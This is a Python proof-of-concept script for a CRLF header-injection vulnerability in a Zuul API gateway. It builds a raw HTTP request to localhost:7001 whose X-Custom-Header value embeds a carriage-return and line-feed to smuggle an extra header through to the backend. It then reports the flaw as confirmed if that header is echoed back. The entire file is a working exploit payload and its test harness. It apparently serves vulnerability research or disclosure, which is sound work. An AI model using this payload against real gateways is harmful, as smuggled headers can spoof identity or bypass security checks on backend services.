import socket
import time

def send_raw_request(host, port, payload):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((host, port))
            s.sendall(payload.encode())

            response = b""
            # Just read what we can
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            return response.decode()
    except Exception as e:
        return f"Error: {e}"

def test_header_injection():
    # Target Zuul Gateway
    GATEWAY_HOST = "localhost"
    GATEWAY_PORT = 7001

    print("=== Zuul Outbound Header Injection PoC ===")

    # Simple header injection showing we can control headers sent to origin
    injection = "value\r\nInjected-Header: Smuggled-Success"

    payload = (
        f"GET /public HTTP/1.1\r\n"
        f"Host: {GATEWAY_HOST}:{GATEWAY_PORT}\r\n"
        f"X-Custom-Header: {injection}\r\n"
        f"Connection: close\r\n\r\n"
    )

    print(f"\n[+] Sending malicious request to Zuul at {GATEWAY_HOST}:{GATEWAY_PORT}...")

    response = send_raw_request(GATEWAY_HOST, GATEWAY_PORT, payload)

    print("\n[+] Response from Gateway (Echoed by Backend):")
    print("--- Response Start ---")
    print(response)
    print("--- Response End ---")

    if "Injected-Header: Smuggled-Success" in response:
        print("\n[!] VULNERABILITY CONFIRMED: Outbound Header Injection Successful!")
        print("The gateway failed to validate headers and passed CRLF to the backend.")
    else:
        print("\n[-] Injection failed.")

if __name__ == "__main__":
    test_header_injection()
